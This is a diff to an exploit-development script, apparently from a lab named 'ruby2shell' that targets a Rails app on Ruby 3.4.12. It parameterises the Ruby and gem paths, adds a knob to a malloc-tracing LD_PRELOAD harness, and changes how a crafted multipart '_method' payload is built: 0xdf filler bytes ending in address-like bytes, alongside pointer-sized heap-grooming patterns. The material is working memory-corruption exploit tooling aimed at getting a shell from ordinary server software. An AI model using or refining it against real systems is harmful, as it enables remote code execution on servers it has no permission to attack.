@@ -30,7 +30,7 @@ else
   APP=lab/build/rails-stock-app
   READY_PATH=/up
 fi
-RB=lab/build/plain/ruby-3.4.12-plain/bin/ruby
+RB="${RUBY2SHELL_CLAIM_RB:-lab/build/plain/ruby-3.4.12-plain/bin/ruby}"
 N="${RUBY2SHELL_CLAIM_N:-588}"
 TAGP="${RUBY2SHELL_CLAIM_TAG:-sc588}"
 PLANT_SPEC="${RUBY2SHELL_CLAIM_PLANT:-946x24}"
@@ -43,7 +43,7 @@ CLAIM_LIST="${RUBY2SHELL_CLAIM_PARTS:-824,2616,3032,3896}"
 COUNT="${RUBY2SHELL_CLAIM_COUNT:-12}"
 GAP="${RUBY2SHELL_CLAIM_GAP:-0}"
 BASE=4810
-export GEM_PATH="$PWD/lab/build/plain/ruby-3.4.12-plain/lib/ruby/gems/3.4.0"
+export GEM_PATH="${RUBY2SHELL_CLAIM_GEMS:-$PWD/lab/build/plain/ruby-3.4.12-plain/lib/ruby/gems/3.4.0}"
 PFX="$EV/$LABEL-$TAGP"
 if [ "${1:-}" = "--one" ]; then
   i="$2"; PORT=$((BASE + i)); TAG="$TAGP-$i"
@@ -67,6 +67,7 @@ if [ "${1:-}" = "--one" ]; then
   else
     SERVER_ENV=("${THREAD_ENV[@]}" "${GDB_ENV[@]}" MTRACE_FD=2 MTRACE_FREE_DUMP=1 \
       MTRACE_CASE_REQUEST=$((N + 44)) \
+      MTRACE_CASE_LEAD_A="${METHOD_LEAD_A:-1}" \
       MTRACE_CASE_ARM_FILE="$ARM" MTRACE_EMIT_ARM_FILE="$ARM" \
       LD_PRELOAD="$PWD/lab/preload/mtrace.so")
   fi
@@ -219,7 +220,7 @@ def part(name, content, ctype):
 AB = b'text/plain; charset=ASCII-8BIT'
 ISO = b'text/plain; charset=ISO-8859-1'
 pattern = (0x250).to_bytes(8, 'little') + (0x90).to_bytes(8, 'little')
-method = b'a' + b'\xdf' * (n - 5) + b'\x00\x00\x51\x02'
+method = b'a' * int(os.environ.get('METHOD_LEAD_A', '1')) + b'\xdf' * (n - 4 - int(os.environ.get('METHOD_LEAD_A', '1'))) + b'\x00\x00\x51\x02'
 if mode == 'poison':
     # poison arm: sub-embed-floor filler parts before _method provide pure
     # object pressure (zero big mallocs, zero pool consumption) so the
